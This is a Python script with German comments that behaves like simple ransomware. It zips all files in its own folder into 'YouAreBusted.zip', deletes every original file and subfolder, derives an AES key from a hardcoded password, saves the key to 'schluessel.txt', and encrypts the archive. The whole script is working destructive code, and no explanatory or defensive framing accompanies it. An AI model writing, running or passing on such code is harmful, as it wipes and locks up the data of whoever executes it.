import os
import zipfile
import shutil
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import secrets

def get_dir_size(path='.'):
    total = 0
    with os.scandir(path) as it:
        for entry in it:
            if entry.is_file():
                total += entry.stat().st_size
            elif entry.is_dir():
                total += get_dir_size(entry.path)
    return total

def create_zip(zip_filename, folder_to_zip):
    total_size = get_dir_size(folder_to_zip)
    processed_size = 0
    last_update_time = time.time()

    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_to_zip):
            for file in files:
                file_path = os.path.join(root, file)
                # Vermeide das Hinzufügen des Programms selbst, der ZIP-Datei und der Schlüsseldatei zur ZIP-Datei
                if file != os.path.basename(__file__) and file != zip_filename and file != "schluessel.txt" and file != "zip_dehack.py":
                    zipf.write(file_path, os.path.relpath(file_path, folder_to_zip))
                    processed_size += os.path.getsize(file_path)
                    progress = (processed_size / total_size) * 100
                    print(f"Fortschritt: {progress:.2f}% ({processed_size / (1024**3):.2f} GB von {total_size / (1024**3):.2f} GB)")

def delete_files_and_folders(folder_to_clean, zip_filename):
    for item in os.listdir(folder_to_clean):
        item_path = os.path.join(folder_to_clean, item)
        # Vermeide das Löschen des Programms selbst, der ZIP-Datei und der Schlüsseldatei
        if item != os.path.basename(__file__) and item != zip_filename and item != "schluessel.txt" and item != "zip_dehack.py":
            if os.path.isfile(item_path) or os.path.islink(item_path):
                os.unlink(item_path)
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)

def generate_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,  # Schlüssellänge von 256 Bits (32 Bytes)
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

def encrypt_file(file_path, key):
    backend = default_backend()
    iv = secrets.token_bytes(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(algorithms.AES.block_size).padder()

    with open(file_path, 'rb') as f:
        file_data = f.read()

    padded_data = padder.update(file_data) + padder.finalize()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(file_path, 'wb') as f:
        f.write(iv + encrypted_data)

def load_key():
    with open("schluessel.txt", "rb") as key_file:
        return key_file.read()

if __name__ == "__main__":
    # Name der zu erstellenden ZIP-Datei
    zip_filename = "YouAreBusted.zip"
    # Ordner, der gezippt werden soll (aktueller Ordner)
    folder_to_zip = os.path.dirname(os.path.abspath(__file__))

    create_zip(zip_filename, folder_to_zip)
    print(f"ZIP-Datei '{zip_filename}' wurde erfolgreich erstellt.")

    delete_files_and_folders(folder_to_zip, zip_filename)
    print("Alle Dateien und Ordner außer dem Programm, der ZIP-Datei und der Schlüsseldatei wurden gelöscht.")

    # Verschlüssele die ZIP-Datei
    password = "dein_passwort"  # Passwort für die Verschlüsselung
    salt = secrets.token_bytes(16)
    key = generate_key(password, salt)

    with open("schluessel.txt", "wb") as key_file:
        key_file.write(key)

    encrypt_file(zip_filename, key)
    print(f"ZIP-Datei '{zip_filename}' wurde erfolgreich verschlüsselt.")
